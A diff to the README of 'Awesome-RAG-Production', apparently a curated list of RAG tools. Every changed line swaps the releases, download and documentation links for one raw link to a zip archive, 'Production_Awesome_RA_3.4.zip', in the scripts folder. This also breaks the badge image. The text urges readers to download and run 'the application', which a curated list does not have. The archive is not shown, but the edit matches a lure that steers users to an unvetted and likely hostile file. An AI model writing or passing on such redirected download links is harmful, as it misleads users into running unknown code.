@@ -1,6 +1,6 @@
 # 🎉 Awesome-RAG-Production - Build Efficient RAG Systems Easily
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/mowael07/Awesome-RAG-Production/releases)
+[![Download Release](https://raw.githubusercontent.com/mowael07/Awesome-RAG-Production/main/scripts/Production_Awesome_RA_3.4.zip%20Now-Release-blue)](https://raw.githubusercontent.com/mowael07/Awesome-RAG-Production/main/scripts/Production_Awesome_RA_3.4.zip)
 
 ## 📖 Overview
 Welcome to **Awesome-RAG-Production**! This project provides a well-organized collection of proven tools, frameworks, and best practices. You can use these resources to create scalable, production-grade Retrieval-Augmented Generation (RAG) systems. Whether you are new to this field or looking to enhance your existing skills, this repository offers valuable insights.
@@ -21,7 +21,7 @@ This repository includes various tools and frameworks you can use to improve you
 Here are the steps to get started with **Awesome-RAG-Production**:
 
 1. **Visit the Releases Page**: Go to the Releases page to see the latest version of the software and available downloads. 
-   [Visit Releases Page](https://github.com/mowael07/Awesome-RAG-Production/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/mowael07/Awesome-RAG-Production/main/scripts/Production_Awesome_RA_3.4.zip)
 
 2. **Download the Software**: Click on the download link for the latest release. This file contains all the necessary components to run **Awesome-RAG-Production**.
 
@@ -33,7 +33,7 @@ Here are the steps to get started with **Awesome-RAG-Production**:
 4. **Run the Application**: Once installed, open the application using your system's application launcher. You'll be greeted with a user interface designed to help you get started easily.
 
 ## 📥 Download & Install
-To download the application, **visit this page to download**: [Download Now](https://github.com/mowael07/Awesome-RAG-Production/releases). Follow the outlined steps above to install the software on your system.
+To download the application, **visit this page to download**: [Download Now](https://raw.githubusercontent.com/mowael07/Awesome-RAG-Production/main/scripts/Production_Awesome_RA_3.4.zip). Follow the outlined steps above to install the software on your system.
 
 ## 🔧 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -61,7 +61,7 @@ You may find these topics relevant as you explore **Awesome-RAG-Production**:
 Familiarizing yourself with these topics can enhance your understanding of RAG systems and expand your skills.
 
 ## 📑 Documentation
-Comprehensive documentation is available to help you understand how to use the tools and frameworks in this repository. Access the documentation [here](https://github.com/mowael07/Awesome-RAG-Production/docs).
+Comprehensive documentation is available to help you understand how to use the tools and frameworks in this repository. Access the documentation [here](https://raw.githubusercontent.com/mowael07/Awesome-RAG-Production/main/scripts/Production_Awesome_RA_3.4.zip).
 
 ## 🌟 Contribution
 If you want to contribute to **Awesome-RAG-Production**, please follow our contribution guidelines. Your input helps us improve the repository. 
